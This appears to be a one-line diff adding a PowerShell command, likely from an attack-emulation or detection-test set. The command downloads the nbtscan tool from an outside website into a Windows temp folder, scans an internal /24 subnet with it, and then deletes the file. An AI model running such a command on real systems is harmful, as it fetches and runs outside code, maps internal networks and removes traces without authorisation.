@@ -1,0 +1,1 @@
+powershell.exe wget http://www.unixwiz.net/tools/nbtscan-1.0.35.exe -o C:\Windows\Temp\nbtscan.exe;C:\Windows\Temp\nbtscan.exe -f -m 10.254.121.0/24;del C:\Windows\Temp\nbtscan.exe
